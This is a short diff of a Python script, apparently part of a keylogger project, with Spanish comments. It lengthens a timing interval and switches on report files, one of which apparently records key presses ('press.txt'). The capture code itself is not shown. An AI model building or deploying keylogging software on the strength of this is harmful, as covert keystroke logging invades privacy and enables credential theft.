@@ -7,13 +7,14 @@ from datetime import datetime
 #fecha = datetime.now()
 #m = "keylogger_{}.txt".format(fecha.strftime("%Y-%m-%d_%H-%M-%S"))
 
-intervalo = 10 #en segundos
+intervalo = 120 #en segundos 
 #Definiendo reportes
-#main=report.report(m)
-#arqui=report.report("arch.txt")
-#arqui.arch()
+#main=report.report(m)  
+arqui=report.report("arch.txt")    
+arqui.arch()   
 repo_timing=report.report("press.txt")
 
 #iniciando proceso
 tiempos = timing.tiempos(intervalo)
 tiempos.start(repo_timing)
+
